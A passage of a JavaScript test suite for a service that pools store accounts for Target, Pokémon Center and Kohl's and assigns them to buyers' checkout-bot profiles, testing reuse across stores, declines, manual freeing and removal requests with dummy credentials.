    const link = offerLink(webhookPosts.at(-1).content); assert.ok(link, webhookPosts.at(-1).content);
    const html = await (await offerPost(link, "add")).text();
    assert.match(html, new RegExp(`Added ${added ?? "\\d+"} to your list`));
    return html;
  };
  const batchPost = (from) => webhookPosts.slice(from).find((m) => m.content.startsWith("📦"));
  const pcFile = (names, assigned) => ({ store: "Pokémon Center", storeKey: "pokemoncenter", kind: "profiles", text: slotCsv(names.map((n) => slotRow(n, ""))), assigned: assigned ?? names.length });
  const tgFile = (names) => ({ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv(names.map((n) => slotRow(n, ""))), assigned: names.length });
  const given = async () => (await accounts()).given.filter((a) => a.key_last4 === hanaKey.slice(-4));
  const stockOf = async () => (await accounts()).stores.find((x) => x.store === "*");
  // Each account's password, whichever store it was sent for: it's what Target's logins file gets.
  const PW = { "tgt1@outlook.com": "Tgt-Pw-1!", "tgt2@outlook.com": "Tgt-Pw-2!", "pc1@outlook.com": "Pc-Pw-1!", "pc2@outlook.com": "Pc-Pw-2!", "pc3@outlook.com": "Pc-Pw-3!" };
  const ours = /^(tgt[12]|pc[123]|lia\.tgt)@outlook\.com$/;
  let tA, tB;
  await test("accounts sent for Target or for Pokémon Center go on one list, for both", async () => {
    hanaKey = await newKey("hana"); ivanKey = await newKey("ivan");
    const s0 = await stockOf();
    assert.equal(s0.free, 0, "none free from the tests above");
    await offerAdd(ivanKey, "target", "Target", ["tgt1", "tgt2"].map((n) => ({ email: `${n}@outlook.com`, password: PW[`${n}@outlook.com`] })), 2);
    const html = await offerAdd(ivanKey, "pokemoncenter", "Pokémon Center", ["pc1", "pc2", "pc3"].map((n) => ({ email: `${n}@outlook.com`, password: PW[`${n}@outlook.com`] })), 3);
    assert.match(html, /3 accounts for Use Assigned Account at Target and Pokémon Center/);
    assert.match(html, /Your list: \d+ accounts, 5 free\./);
    await new Promise((ok) => setTimeout(ok, 300));
    assert.match(webhookEdits.at(-1).content, /^✅ \*\*Added 3 accounts to your list\*\* for Use Assigned Account/, "no store named");
    assert.deepEqual((await accounts()).stores.map((x) => x.store), ["*"], "no store's own list for them");
    assert.deepEqual(await stockOf(), { ...s0, total: s0.total + 5, free: 5 });
  });
  await test("in one batch, a profile's slots at both stores get one account; another profile gets its own", async () => {
    const before = webhookPosts.length;
    // The app sends Pokémon Center before Target; Hana C has no Target slot.
    const files = [pcFile(["Hana A", "Hana C", "Hana B"]), tgFile(["Hana A", "Hana B"])];
    const r = await (await slots("/submissions", hanaKey, { files, name: "Hana", slots: 5, batch: "one1" + rid(),
      stores: [{ name: "Pokémon Center", n: 3, seller: 3 }, { name: "Target", n: 2, seller: 2 }] })).json();
    assert.deepEqual(r.accounts, { "Pokémon Center": { asked: 3, got: 3, reused: 2 }, Target: { asked: 2, got: 2 } });
    const m = batchPost(before);
    assert.match(m.content, /\nPokémon Center 3 \(3 assigned accounts, 2 reused from Target\) · Target 2 \(2 assigned accounts\)\n/);
    const [tgLog, ...more] = plain(m), [pcA, tgA] = aycdOf(m);
    assert.equal(more.length, 0, "only Target's logins file: Pokémon Center's email is on its AYCD profiles");
    [tA, tB] = emailsOf(tgA);
    assert.ok(ours.test(tA) && ours.test(tB) && tA !== tB, [tA, tB]);
    assert.equal(tgLog.text, `${tA}:${PW[tA]}\r\n${tB}:${PW[tB]}`, "each with its own password");
    const pc = emailsOf(pcA);
    assert.deepEqual(pcA.map((x) => x.name), ["Hana A", "Hana C", "Hana B"], "rows in the order sent");
    assert.equal(pc[0], tA); assert.equal(pc[2], tB); assert.ok(ours.test(pc[1]) && ![tA, tB].includes(pc[1]), pc);
    assert.deepEqual(pcA.map((x) => [x.name, x.shippingAddress.email, x.billingAddress.email]), [["Hana A", tA, tA], ["Hana C", pc[1], pc[1]], ["Hana B", tB, tB]]);
    assert.equal((await stockOf()).free, 2, "three accounts given: one each for Hana A, B and C");
    const g = await given();
    assert.deepEqual(listGiven({ given: g }).map((a) => [a.email, a.profile]).sort(), [[tA, "Hana A"], [tB, "Hana B"], [pc[1], "Hana C"]].sort(), "each profile has one");
    assert.deepEqual(g.filter((a) => a.store !== "*").map((a) => [a.store, a.email, a.profile, a.reused]).sort(),
      [["pokemoncenter", tA, "Hana A", 1], ["pokemoncenter", tB, "Hana B", 1], ["pokemoncenter", pc[1], "Hana C", 1], ["target", tA, "Hana A", 1], ["target", tB, "Hana B", 1]].sort(),
      "and each slot a row of its own, which isn't one of the owner's accounts");
  });
  await test("a profile's Target slot sent after its Pokémon Center slot gets the same account", async () => {
    // Hana C's account came for her Pokémon Center slot above.
    const c = listGiven({ given: await given() }).find((a) => a.profile === "Hana C").email, before = webhookPosts.length, free = (await stockOf()).free;
    const r = await (await slots("/submissions", hanaKey, { files: [tgFile(["Hana C"])], name: "Hana", slots: 1, batch: "one2" + rid(), stores: [{ name: "Target", n: 1, seller: 1 }] })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 1, got: 1, reused: 1 } });
    const m = batchPost(before);
    assert.match(m.content, /\nTarget 1 \(1 assigned account, 1 reused from Pokémon Center\)\n/);
    assert.equal(emailsOf(aycdOf(m)[0])[0], c); assert.equal(plain(m)[0].text, `${c}:${PW[c]}`, "its own password, in Target's logins file");
    assert.equal((await stockOf()).free, free, "no second account taken from the list");
  });
  await test("a slot sent again takes its account along, and pulling it finds the account at its store", async () => {
    const before = webhookPosts.length;
    const r = await (await slots("/submissions", hanaKey, { files: [pcFile(["Hana A"])], name: "Hana", slots: 1, batch: "one3" + rid(), stores: [{ name: "Pokémon Center", n: 1, seller: 1 }] })).json();
    assert.deepEqual(r.accounts, { "Pokémon Center": { asked: 1, got: 1 } });
    const m = batchPost(before);
    assert.match(m.content, /\nPokémon Center 1 \(1 assigned account, 1 they had before\)\n/);
    assert.equal(emailsOf(aycdOf(m)[0])[0], tA); assert.deepEqual(plain(m), [], "no logins file");
    const p0 = webhookPosts.length;
    await pull(hanaKey, { keyId: "CSV", name: "Hana", slots: [{ store: "Pokémon Center", profile: "Hana A", email: "Assigned account", card: "Visa 4242" }] });
    assert.ok(webhookPosts[p0].content.includes(`Pokémon Center · Hana A · ${tA} \\(assigned account\\)`), webhookPosts[p0].content);
    assert.doesNotMatch(webhookPosts[p0].content, /Pw-/);
  });
  await test("an email sent for both stores is one account on the list, with the password it came with first", async () => {
    const s0 = await stockOf();
    await offerAdd(ivanKey, "target", "Target", [{ email: "lia.tgt@outlook.com", password: "Tgt-Pw-3!" }], 1);
    const html = await offerAdd(ivanKey, "pokemoncenter", "Pokémon Center", [{ email: "LIA.TGT@outlook.com", password: "Inbox-Pw-3!" }], 0);
    assert.match(html, /Added 0 to your list\. 1 was already on it\./);
    assert.deepEqual(await stockOf(), { ...s0, total: s0.total + 1, free: s0.free + 1 });
    PW["lia.tgt@outlook.com"] = "Tgt-Pw-3!";
  });
  await test("a batch that doesn't reach the channel gives nothing out; sent again, it picks again", async () => {
    const batch = "one4" + rid(), s0 = await stockOf(), g0 = (await given()).length;
    const send = () => slots("/submissions", hanaKey, { files: [pcFile(["Hana D"]), tgFile(["Hana D"])], name: "Hana", slots: 2, batch,
      stores: [{ name: "Pokémon Center", n: 1, seller: 1 }, { name: "Target", n: 1, seller: 1 }] });
    webhookFail.push(500);
    assert.equal((await send()).status, 502);
    assert.deepEqual(await stockOf(), s0, "back on the list");
    assert.equal((await given()).length, g0, "and no slot's row of it is left");
    const before = webhookPosts.length;
    const r = await (await send()).json();
    assert.deepEqual(r.accounts, { "Pokémon Center": { asked: 1, got: 1, reused: 1 }, Target: { asked: 1, got: 1 } }, "Target first, then Pokémon Center reuses it");
    const [pcL, tgL] = aycdOf(batchPost(before)).map(emailsOf);
    assert.equal(pcL[0], tgL[0], "one account for both"); assert.ok(ours.test(pcL[0]));
    assert.equal((await stockOf()).free, s0.free - 1);
  });
  await test("with the list out, a profile's account still goes to its slots, and slots left without one come last", async () => {
    assert.equal((await stockOf()).free, 2);
    const before = webhookPosts.length;
    const r = await (await slots("/submissions", hanaKey, { files: [pcFile(["Hana E", "Hana F", "Hana G", "Hana B"])], name: "Hana", slots: 4, batch: "one5" + rid(),
      stores: [{ name: "Pokémon Center", n: 4, seller: 4 }] })).json();
    assert.deepEqual(r.accounts, { "Pokémon Center": { asked: 4, got: 3 } });
    const m = batchPost(before), list = aycdOf(m)[0], em = emailsOf(list);
    assert.deepEqual(plain(m), [], "no logins file");
    assert.match(m.content, /\nPokémon Center 4 \(3 assigned accounts, 1 they had before, 1 needs an account: your list has none\)\n/);
    assert.deepEqual(list.map((x) => x.name), ["Hana E", "Hana F", "Hana B", "Hana G"]);
    assert.ok(ours.test(em[0]) && ours.test(em[1]) && em[0] !== em[1], em); assert.equal(em[2], tB); assert.equal(em[3], "");
    assert.equal((await stockOf()).free, 0);
    assert.match(webhookPosts.at(-1).content, /^🚫 \*\*No accounts left\*\* on your list for Use Assigned Account\./, "the owner is told");
  });
  await test("an account given to one buyer never goes to another, at either store", async () => {
    const before = webhookPosts.length;
    const r = await (await slots("/submissions", bobKey, { files: [pcFile(["Bob P"]), tgFile(["Bob P"])], name: "Bob", slots: 2, batch: "one6" + rid(),
      stores: [{ name: "Pokémon Center", n: 1, seller: 1 }, { name: "Target", n: 1, seller: 1 }] })).json();
    assert.deepEqual(r.accounts, { "Pokémon Center": { asked: 1, got: 0 }, Target: { asked: 1, got: 0 } });
    assert.match(batchPost(before).content, /\nPokémon Center 1 \(1 needs an account: your list has none\) · Target 1 \(1 needs an account: your list has none\)\n/);
    const all = (await accounts()).given, owner = new Map(listGiven({ given: all }).map((a) => [a.email, a.key_last4]));
    assert.ok(all.every((a) => owner.get(a.email) === a.key_last4), "every slot's row is its account's buyer's");
    assert.equal(new Set(listGiven({ given: all }).map((a) => a.email)).size, listGiven({ given: all }).length, "and each account is given once");
  });
  await test("a license's limit counts an account once, however many of its slots use it", async () => {
    const g = await given();
    assert.equal(listGiven({ given: g }).length, 6, "Hana A to F");
    assert.ok(g.length > 6, "with more slots' rows than that");
  });
  await test("freeing a license's accounts by hand puts them back, and drops every slot's row of them", async () => {
    const s0 = await stockOf();
    assert.equal((await admin("/admin/accounts/free", { key: hanaKey })).status, 200);
    assert.deepEqual(await given(), []);
    assert.deepEqual(await stockOf(), { ...s0, free: s0.free + 6, sent: s0.sent - 6 });
    const d = await accounts();
    assert.ok(!d.given.some((a) => a.reused && !listGiven(d).some((m) => m.email === a.email)), "no slot's row left without its account");
  });
  await test("declining a batch puts its accounts back on the list, with every slot's row of them", async () => {
    const s0 = await stockOf(), before = webhookPosts.length;
    const r = await (await slots("/submissions", hanaKey, { files: [tgFile(["Hana Q"]), pcFile(["Hana Q"])], name: "Hana", slots: 2, batch: "dcl" + rid(),
      stores: [{ name: "Target", n: 1, seller: 1 }, { name: "Pokémon Center", n: 1, seller: 1 }] })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 1, got: 1 }, "Pokémon Center": { asked: 1, got: 1, reused: 1 } });
    assert.equal((await given()).length, 3, "the account, and its Target and Pokémon Center slots' rows");
    const link = approveLink(batchPost(before).content);
    assert.match(await (await approvePost(link, "decline-ask")).text(), /The 1 account given to them goes back on your list\./);
    assert.match(await (await approvePost(link, "decline")).text(), /Declined\. Their FAFO now shows these slots as Declined\. 1 account given to them is back on your list\./);
    assert.deepEqual(await given(), []);
    assert.deepEqual(await stockOf(), s0);
  });
  // The account stays with the buyer while any of their slots uses it (2026-10-07, the owner's request, for the one list),
  // so the list can't give it to a second buyer. Quinn is the buyer here (Hana has sent close to the hourly limit of batches).
  let quinnKey;
  const slotsOf = async (email) => (await accounts()).given.filter((a) => a.key_last4 === quinnKey.slice(-4) && a.email === email && a.store !== "*").map((a) => [a.store, a.batch]).sort();
  const owns = async (email) => listGiven(await accounts()).some((a) => a.key_last4 === quinnKey.slice(-4) && a.email === email);
  const pcPull = (batch, profile) => pull(quinnKey, { keyId: "CSV", name: "Quinn", batch, slots: [{ store: "Pokémon Center", profile, email: "Assigned account", card: "Visa 4242" }] });
  const sendBatch = async (files, stores) => {
    const batch = "kp" + rid(), before = webhookPosts.length;
    const r = await (await slots("/submissions", quinnKey, { files, name: "Quinn", slots: stores.reduce((n, x) => n + x.n, 0), batch, stores })).json();
    const m = batchPost(before);
    return { batch, r, m, link: approveLink(m.content), emails: aycdOf(m).map(emailsOf) };
  };
  const TG1 = [{ name: "Target", n: 1, seller: 1 }], PC1 = [{ name: "Pokémon Center", n: 1, seller: 1 }];
  const KEPT = "1 account stays with them: their slot at the other store in another batch uses it too.";
  await test("declining a Target batch keeps its account while the profile's Pokémon Center slot in another batch uses it", async () => {
    quinnKey = await newKey("quinn");
    const t = await sendBatch([tgFile(["Quinn K"])], TG1);
    const [[tk]] = t.emails;
    const p = await sendBatch([pcFile(["Quinn K"])], PC1);
    assert.deepEqual(p.r.accounts, { "Pokémon Center": { asked: 1, got: 1, reused: 1 } });
    assert.equal(p.emails[0][0], tk, "the Pokémon Center slot checks out with the same account");
    const s0 = await stockOf();
    const ask = await (await approvePost(t.link, "decline-ask")).text();
    assert.ok(ask.includes(KEPT), ask); assert.doesNotMatch(ask, /back on your list/, "nothing goes back");
    const done = await (await approvePost(t.link, "decline")).text();
    assert.ok(done.includes(`Declined. Their FAFO now shows these slots as Declined. ${KEPT}`), done);
    assert.deepEqual(await stockOf(), s0, "not back on the list");
    assert.ok(await owns(tk)); assert.deepEqual(await slotsOf(tk), [["pokemoncenter", p.batch]], "the buyer's, for the slot that uses it");
    // Declining the batch that uses it puts it back.
    const ask2 = await (await approvePost(p.link, "decline-ask")).text();
    assert.match(ask2, /The 1 account given to them goes back on your list\./, ask2); assert.doesNotMatch(ask2, /stays with them/);
    assert.match(await (await approvePost(p.link, "decline")).text(), /Declined\. Their FAFO now shows these slots as Declined\. 1 account given to them is back on your list\./);
    assert.deepEqual(await stockOf(), { ...s0, free: s0.free + 1, sent: s0.sent - 1 });
    assert.ok(!(await owns(tk))); assert.deepEqual(await slotsOf(tk), []);
  });
  await test("a slot sent again takes its account along; declining the batch it left changes nothing", async () => {
    const t = await sendBatch([tgFile(["Quinn M"])], TG1);
    const [[tm]] = t.emails;
    const p1 = await sendBatch([pcFile(["Quinn M"])], PC1);
    await pcPull(p1.batch, "Quinn M");
    const p2 = await sendBatch([pcFile(["Quinn M"])], PC1);
    assert.equal(p2.emails[0][0], tm, "the same account again");
    assert.match(p2.m.content, /\nPokémon Center 1 \(1 assigned account, 1 they had before\)\n/);
    assert.deepEqual(await slotsOf(tm), [["pokemoncenter", p2.batch], ["target", t.batch]], "its row moved to the batch it's in now");
    const s0 = await stockOf();
    const d1 = await (await approvePost(p1.link, "decline")).text();
    assert.match(d1, /Declined\. Their FAFO now shows these slots as Declined\./, d1); assert.doesNotMatch(d1, /back on your list|stays with them/, "it held nothing");
    assert.deepEqual(await slotsOf(tm), [["pokemoncenter", p2.batch], ["target", t.batch]]);
    assert.ok((await (await approvePost(p2.link, "decline")).text()).includes(KEPT), "the Target slot still uses it");
    assert.deepEqual(await slotsOf(tm), [["target", t.batch]]); assert.deepEqual(await stockOf(), s0);
    assert.match(await (await approvePost(t.link, "decline")).text(), /1 account given to them is back on your list\./);
    assert.deepEqual(await slotsOf(tm), []); assert.deepEqual(await stockOf(), { ...s0, free: s0.free + 1, sent: s0.sent - 1 });
  });
  await test("a slot sent again whose batch doesn't reach the channel leaves its account where it was", async () => {
    const t = await sendBatch([tgFile(["Quinn N"])], TG1);
    const [[tn]] = t.emails;
    const p1 = await sendBatch([pcFile(["Quinn N"])], PC1);
    await pcPull(p1.batch, "Quinn N");
    webhookFail.push(500);
    assert.equal((await slots("/submissions", quinnKey, { files: [pcFile(["Quinn N"])], name: "Quinn", slots: 1, batch: "kpf" + rid(), stores: PC1 })).status, 502);
    assert.deepEqual(await slotsOf(tn), [["pokemoncenter", p1.batch], ["target", t.batch]], "still in the batch that reached the channel");
    const s0 = await stockOf();
    assert.ok((await (await approvePost(t.link, "decline")).text()).includes(KEPT));
    assert.match(await (await approvePost(p1.link, "decline")).text(), /1 account given to them is back on your list\./);
    assert.deepEqual(await slotsOf(tn), []); assert.deepEqual(await stockOf(), { ...s0, free: s0.free + 1, sent: s0.sent - 1 });
  });
  await test("a declined Target slot sent again gets back the account its Pokémon Center slot kept", async () => {
    const t = await sendBatch([tgFile(["Quinn R"])], TG1);
    const [[tr]] = t.emails;
    const p = await sendBatch([pcFile(["Quinn R"])], PC1);
    await approvePost(t.link, "decline");
    const s0 = await stockOf();
    const t2 = await sendBatch([tgFile(["Quinn R"])], TG1);
    assert.deepEqual(t2.r.accounts, { Target: { asked: 1, got: 1, reused: 1 } });
    assert.match(t2.m.content, /\nTarget 1 \(1 assigned account, 1 reused from Pokémon Center\)\n/);
    assert.equal(t2.emails[0][0], tr, "the same email at both stores again");
    assert.deepEqual(await stockOf(), s0, "no second account taken from the list");
    assert.deepEqual(await slotsOf(tr), [["pokemoncenter", p.batch], ["target", t2.batch]]);
    await approvePost(p.link, "decline");
    assert.deepEqual(await slotsOf(tr), [["target", t2.batch]], "the Target slot sent again keeps it");
    await approvePost(t2.link, "decline");
    assert.deepEqual(await slotsOf(tr), []); assert.deepEqual(await stockOf(), { ...s0, free: s0.free + 1, sent: s0.sent - 1 });
  });
  await test("approved, pulled and sent again: declining the new batch puts the account back", async () => {
    const t = await sendBatch([tgFile(["Quinn S"])], TG1);
    const [[ts]] = t.emails;
    const p = await sendBatch([pcFile(["Quinn S"])], PC1);
    await approvePost(t.link, "decline");
    await approvePost(p.link, "approve");
    await pcPull(p.batch, "Quinn S");
    const p3 = await sendBatch([pcFile(["Quinn S"])], PC1);
    assert.deepEqual(await slotsOf(ts), [["pokemoncenter", p3.batch]]);
    const s0 = await stockOf();
    assert.match(await (await approvePost(p3.link, "decline-ask")).text(), /The 1 account given to them goes back on your list\./);
    assert.match(await (await approvePost(p3.link, "decline")).text(), /1 account given to them is back on your list\./);
    assert.deepEqual(await slotsOf(ts), []); assert.deepEqual(await stockOf(), { ...s0, free: s0.free + 1, sent: s0.sent - 1 });
  });
  await test("freeing an account by hand: by its email, every slot's row goes; with a store, that slot's only", async () => {
    const t = await sendBatch([tgFile(["Quinn P"]), pcFile(["Quinn P"])], [...TG1, ...PC1]);
    const [[tp], [pp]] = t.emails;
    assert.equal(pp, tp);
    assert.equal((await slotsOf(tp)).length, 2);
    assert.equal((await admin("/admin/accounts/free", { email: tp })).status, 200);
    assert.deepEqual(await slotsOf(tp), [], "neither slot has it"); assert.ok(!(await owns(tp)));
    await approvePost(t.link, "decline");
    const u = await sendBatch([tgFile(["Quinn V"]), pcFile(["Quinn V"])], [...TG1, ...PC1]);
    const [[tv]] = u.emails, s0 = await stockOf();
    assert.equal((await admin("/admin/accounts/free", { email: tv, store: "target" })).status, 200);
    assert.deepEqual(await slotsOf(tv), [["pokemoncenter", u.batch]], "only the Target slot's row goes"); assert.ok(await owns(tv)); assert.deepEqual(await stockOf(), s0);
    assert.equal((await admin("/admin/accounts/free", { email: tv, store: "pokemoncenter" })).status, 200);
    assert.deepEqual(await slotsOf(tv), []); assert.ok(!(await owns(tv)), "with no slot left, it's back on the list");
    assert.deepEqual(await stockOf(), { ...s0, free: s0.free + 1, sent: s0.sent - 1 });
    await approvePost(u.link, "decline");
  });
  await test("declining the old batch while the slot sent again is posting leaves the account with the new one", async () => {
    const t = await sendBatch([tgFile(["Quinn U"])], TG1);
    const [[tu]] = t.emails;
    const p1 = await sendBatch([pcFile(["Quinn U"])], PC1);
    await pcPull(p1.batch, "Quinn U");
    webhookHang = { ms: 2500 };
    const sending = sendBatch([pcFile(["Quinn U"])], PC1);
    await new Promise((ok) => setTimeout(ok, 1000));
    assert.match(await (await approvePost(p1.link, "decline")).text(), /Declined\./);
    const p2 = await sending;
    assert.equal(p2.emails[0][0], tu);
    assert.deepEqual(await slotsOf(tu), [["pokemoncenter", p2.batch], ["target", t.batch]], "the posted batch has it; the declined one didn't free it");
    // Same with a declined Target slot sent again while its Pokémon Center batch is declined.
    await approvePost(t.link, "decline");
    assert.deepEqual(await slotsOf(tu), [["pokemoncenter", p2.batch]]); assert.ok(await owns(tu));
    webhookHang = { ms: 2500 };
    const resend = sendBatch([tgFile(["Quinn U"])], TG1);
    await new Promise((ok) => setTimeout(ok, 1000));
    await approvePost(p2.link, "decline");
    const t2 = await resend;
    assert.equal(t2.emails[0][0], tu, "it gets its account back");
    assert.deepEqual(await slotsOf(tu), [["target", t2.batch]], "and keeps it, though its Pokémon Center slot was declined meanwhile"); assert.ok(await owns(tu));
    await approvePost(t2.link, "decline");
    assert.deepEqual(await slotsOf(tu), []); assert.ok(!(await owns(tu)));
  });
  console.log("\nA profile sent again gets back the account it had (app 1.9.99+, 2026-10-07)");
  // Ivan is the buyer here (sign-ins are rate limited), with the owner's accounts for a store of their own (Kohl's), so
  // the counts are exact. The app says which of its slots are still out on each store (`active`).
  let ritaKey, rA, rB, rC, b1, b2, b1Link;
  const kFile = (names) => ({ store: "Kohl's", storeKey: "kohls", kind: "profiles", text: slotCsv(names.map((n) => slotRow(n, ""))), assigned: names.length });
  const ritaSend = async (names, active, batch = "back" + rid()) => {
    const before = webhookPosts.length;
    const r = await slots("/submissions", ritaKey, { files: [kFile(names)], name: "Rita", slots: names.length, batch,
      stores: [{ name: "Kohl's", n: names.length, seller: names.length }], ...(active ? { active } : {}) });
    const d = await r.json(), m = r.ok ? batchPost(before) : null;
    return { status: r.status, d, m, batch, emails: m ? emailsOf(aycdOf(m)[0]) : [], logins: m && plain(m)[0] ? plain(m)[0].text.split("\r\n") : [] };
  };
  const ritaHeld = async () => (await accounts()).given.filter((a) => a.key_last4 === ritaKey.slice(-4) && a.store === "kohls").map((a) => [a.email, a.profile, a.batch]).sort();
  const kStock = async () => (await accounts()).stores.find((x) => x.store === "kohls");
  await test("setup: three of the owner's Kohl's accounts", async () => {
    ritaKey = ivanKey;
    assert.deepEqual(await ritaHeld(), []);
    // Offered from Hana's license (offers are limited per license a day, and Ivan has sent his).
    await offerAdd(hanaKey, "kohls", "Kohl's", [1, 2, 3].map((i) => ({ email: `kohls${i}@outlook.com`, password: "Kohls-Pw-1!" })));
    assert.ok((await accounts()).given.filter((a) => a.key_last4 === ritaKey.slice(-4)).length <= 7, "room under the limit for these");
    assert.deepEqual(await kStock(), { store: "kohls", total: 3, free: 3, sent: 0 });
  });
  await test("the first time, each slot gets an account", async () => {
    const s = await ritaSend(["Rita A", "Rita B"], { kohls: [] });
    assert.deepEqual(s.d.accounts, { "Kohl's": { asked: 2, got: 2 } });
    assert.match(s.m.content, /\nKohl's 2 \(2 assigned accounts\)\n/);
    [rA, rB] = s.emails; b1 = s.batch; b1Link = approveLink(s.m.content);
    assert.ok(/^kohls[123]@outlook\.com$/.test(rA) && /^kohls[123]@outlook\.com$/.test(rB) && rA !== rB, s.emails);
    assert.deepEqual(await ritaHeld(), [[rA, "Rita A", b1], [rB, "Rita B", b1]].sort());
  });
  await test("sent again after its slot was switched off, a profile gets back the account it had, and the line says so", async () => {
    const s = await ritaSend(["Rita A"], { kohls: ["Rita B"] });
    assert.deepEqual(s.d.accounts, { "Kohl's": { asked: 1, got: 1 } }, "what the app hears is as before");
    assert.equal(s.emails[0], rA); assert.deepEqual(s.logins, [`${rA}:Kohls-Pw-1!`], "in its logins file too");
    assert.match(s.m.content, /\nKohl's 1 \(1 assigned account, 1 they had before\)\n/);
    b2 = s.batch;
    assert.deepEqual(await ritaHeld(), [[rA, "Rita A", b2], [rB, "Rita B", b1]].sort(), "moved to the new batch: no new account");
    assert.deepEqual(await kStock(), { store: "kohls", total: 3, free: 1, sent: 2 });
  });
  await test("a profile whose slot is still out (or another with its name) gets a new account, never that one", async () => {
    const s = await ritaSend(["Rita B"], { kohls: ["Rita A", "Rita B"] });
    rC = s.emails[0];
    assert.ok(/^kohls[123]@outlook\.com$/.test(rC) && rC !== rA && rC !== rB, s.emails);
    assert.match(s.m.content, /\nKohl's 1 \(1 assigned account\)\n/);
    assert.deepEqual(await kStock(), { store: "kohls", total: 3, free: 0, sent: 3 });
  });
  await test("an app before 1.9.99 doesn't say which slots are out: a new account, as before (none left here, and the line says so)", async () => {
    const s = await ritaSend(["Rita A"], null);
    assert.deepEqual(s.d.accounts, { "Kohl's": { asked: 1, got: 0 } });
    assert.match(s.m.content, /\nKohl's 1 \(1 needs an account: your list has none\)\n/);
    assert.equal(s.emails[0], ""); assert.deepEqual(s.logins, []);
    assert.deepEqual((await ritaHeld()).map((x) => x[0]).sort(), [rA, rB, rC].sort(), "rA stays where it was");
  });
  await test("a given-back account goes back to the batch it came from if the new one never posts", async () => {
    const batch = "back" + rid();
    webhookFail.push(500);
    assert.equal((await ritaSend(["Rita A"], { kohls: [] }, batch)).status, 502);
    assert.deepEqual((await ritaHeld()).find((x) => x[0] === rA), [rA, "Rita A", b2], "back in the batch it came from");
    const s = await ritaSend(["Rita A"], { kohls: [] }, batch);
    assert.equal(s.status, 200); assert.equal(s.emails[0], rA);
    assert.deepEqual((await ritaHeld()).find((x) => x[0] === rA), [rA, "Rita A", batch]);
  });
  await test("declining the batch an account was given back from leaves it with the batch that has it now", async () => {
    assert.match(await (await approvePost(b1Link, "decline")).text(), /1 account given to them is back on your list\./);
    assert.deepEqual((await ritaHeld()).map((x) => x[0]).sort(), [rA, rC].sort(), "Rita B's goes back; Rita A's, given back since, stays");
    assert.deepEqual(await kStock(), { store: "kohls", total: 3, free: 1, sent: 2 });
    // Off the list again, as the tests after these expect it.
    for (const i of [1, 2, 3]) assert.equal((await admin("/admin/accounts/remove", { email: `kohls${i}@outlook.com` })).status, 200);
    assert.equal(await kStock(), undefined);
  });
  console.log("\nTaking accounts off the list from FAFO (app 1.9.90+)");
  const removalLink = (content) => (content.match(/\((http[^)]+\/accounts\/removal\/[^)]+)\)/) || [])[1];
  const removalPost = (link, action) => fetch(link.split("?")[0], { method: "POST", body: new URLSearchParams({ t: new URL(link).searchParams.get("t"), action }) });
  const askRemove = async (emails) => {
    const r = await slots("/accounts/remove", ivanKey, { emails, name: "Owner" });
    await new Promise((ok) => setTimeout(ok, 400));
    return { r, status: r.status, body: await r.json(), m: webhookPosts.at(-1) };
  };
  const stock = async (store) => (await accounts()).stores.find((x) => x.store === store) || { total: 0, free: 0, sent: 0 };
  await test("asking to remove needs a license and emails", async () => {
    assert.equal((await slots("/accounts/remove", null, { emails: ["pc1@outlook.com"] })).status, 401);
    for (const body of [{}, { emails: [] }, { emails: "pc1@outlook.com" }, { emails: ["nope"] }, { emails: ["pc1@outlook.com", "x:y@outlook.com"] }])
      assert.equal((await slots("/accounts/remove", ivanKey, body)).status, 400, JSON.stringify(body));
  });
  let rmLink, gone, other;
  await test("asking posts the count and a review link, never the emails; the page shows where each one is", async () => {
    // Hana gets an account for a Pokémon Center slot, so one of those asked about has been given out.
    const before = webhookPosts.length;
    await slots("/submissions", hanaKey, { files: [pcFile(["Hana Z"])], name: "Hana", slots: 1, batch: "rmv1" + rid(), stores: [{ name: "Pokémon Center", n: 1, seller: 1 }] });
    assert.ok(batchPost(before));
    const g = listGiven(await accounts()).find((a) => a.profile === "Hana Z");
    assert.ok(g && (await accounts()).given.some((a) => a.store === "pokemoncenter" && a.profile === "Hana Z"), "Hana Z got one, for her Pokémon Center slot");
    gone = g.email.toLowerCase();
    // A free one.
    other = ["lia.tgt@outlook.com", "tgt1@outlook.com"].find((e) => e !== gone);
    const { status, body, m } = await askRemove([g.email.toUpperCase(), other, "nobody@example.com", other]);
    assert.equal(status, 200); assert.deepEqual(body, { status: "pending", count: 3 }, "each email counts once, whatever its case");
    assert.match(m.content, /^🗑️ \*\*Take 3 accounts off your list for Use Assigned Account\?\*\*\nAsked by \*\*Owner\*\* · @ivan · license …/);
    assert.ok(![gone, other, "nobody@example.com"].some((e) => m.content.toLowerCase().includes(e)), "no emails in the channel");
    rmLink = removalLink(m.content); assert.ok(rmLink, m.content);
    const html = await (await fetch(rmLink)).text();
    assert.match(html, /3 accounts to take off your list for Use Assigned Account/); assert.match(html, /Only remove these if you asked/);
    assert.ok(html.includes(`<strong>${gone}</strong>: Target and Pokémon Center: given to license …${hanaKey.slice(-4)} for Hana Z<br>`), "the one given out says to whom, once");
    assert.ok(html.includes(`<strong>${other}</strong>: Target and Pokémon Center: free`), "a free one");
    assert.ok(html.includes("<strong>nobody@example.com</strong>: not on your list"));
    assert.match(html, /One given to a buyer's slot stops reporting its orders to them once it's removed\./);
    assert.doesNotMatch(html, /Pw-|Inbox-Pw|Tgt-Pw/, "never a password");
    assert.equal((await fetch(rmLink.replace(/t=[^&]+/, "t=wrong"))).status, 404);
  });
  await test("Keep removes nothing", async () => {
    const pc = await stock("*");
    const { m } = await askRemove(["pc3@outlook.com"]);
    const link = removalLink(m.content);
    assert.match(await (await removalPost(link, "keep")).text(), /Kept\. Nothing was removed\./);
    assert.match(await (await removalPost(link, "remove")).text(), /Kept\. Nothing was removed\./, "decided: stays kept");
    assert.deepEqual(await stock("*"), pc);
    await new Promise((ok) => setTimeout(ok, 300));
    assert.match(webhookEdits.at(-1).content, /^↩️ \*\*Kept 1 account\*\* on your list\nAsked by/); assert.doesNotMatch(webhookEdits.at(-1).content, /Review/);
  });
  await test("Remove takes each off the list, given out or not, with every slot's row of it", async () => {
    const pc = await stock("*");
    assert.match(await (await removalPost(rmLink, "remove")).text(), /Took 2 off your list\. 1 wasn&#39;t on it\./);
    assert.deepEqual(await stock("*"), { store: "*", total: pc.total - 2, free: pc.free - 1, sent: pc.sent - 1 });
    assert.ok(!(await accounts()).given.some((a) => a.profile === "Hana Z"), "Hana Z's is gone, and so is her slot's row of it");
    await new Promise((ok) => setTimeout(ok, 300));
